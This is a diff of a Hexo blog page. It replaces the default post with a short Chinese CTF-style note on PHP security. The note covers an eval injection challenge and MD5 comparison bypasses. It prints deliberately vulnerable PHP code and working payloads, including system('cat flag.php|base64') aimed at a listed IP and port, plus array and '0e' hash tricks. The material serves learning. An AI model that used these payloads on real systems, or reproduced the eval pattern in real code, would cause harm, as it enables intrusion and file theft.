@@ -3,7 +3,7 @@
 <html lang="zh-CN">
     <head>
         <meta charset="utf-8" />
-        <title>Hello World | Whispering Words</title>
+        <title>PHPsafe | Whispering Words</title>
         <meta name="author" content="花下醉" />
         <meta name="description" content="此心安处" />
         <meta name="keywords" content="" />
@@ -160,7 +160,7 @@
             <div id="main" v-show="!loading">
                 <div class="article">
     <div>
-        <h1>Hello World</h1>
+        <h1>PHPsafe</h1>
     </div>
     <div id="toc-container">
         <!-- toc -->
@@ -171,31 +171,56 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2023/4/12
+            2023/5/7
         </span>
         
+        <span class="category">
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                网络安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/php/" style="color: #00bcd4">php</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/web/" style="color: #00a596">web</a>
+            </span>
+            
+        </span>
         
     </div>
     
     <div class="content" v-pre>
         
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval"><span class="toc-text">eval</span></a></li></ol>
     </div>
     
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
+        <h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre><code class="bash">&lt;?php
+    include &quot;flag.php&quot;;
+    $a = @$_REQUEST[&#39;hello&#39;];
+    eval( &quot;var_dump($a);&quot;);
+    show_source(__FILE__);
+?&gt;
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p><code>http://114.67.175.224:14508/?hello=file(&quot;flag.php&quot;)</code><br> 我还是觉得，脱离了基础全是浮云虚幻</p>
+<p><code>?hello=system(&quot;cat%20flag.php|base64&quot;)</code><br>或许这个更适合我，只不过需要注意 ｜base64</p>
+<p>$_SERVER：包含服务器及其执行环境的信息，如头信息、路径等。<br>$_GET：包含通过 HTTP GET 方法传递给脚本的变量。<br>$_POST：包含通过 HTTP POST 方法传递给脚本的变量。<br>$_COOKIE：包含通过 HTTP Cookies 传递给脚本的变量。<br>$_FILES：包含通过 HTTP POST 方法上传的文件信息。<br>$_ENV：包含环境变量。<br>$_REQUEST：包含 $_GET、$_POST 和 $_COOKIE 的内容。请注意，由于它会合并其他超全局变量的数据，因此不建议在实际代码中使用 $_REQUEST，因为它可能导致安全隐患。<br>$_SESSION：包含当前脚本可用的会话变量。在使用 session_start() 函数启动会话后，可以使用 $_SESSION 来存储和检索跨页面请求的数据。<br>$GLOBALS：包含所有全局变量的关联数组</p>
+<p>1.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br><code>url/?kkeyey1[]=1&amp;kkeyey2[]=2</code><br>2，利用&#x3D;&#x3D;比较漏洞</p>
+<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
 
     </div>
     
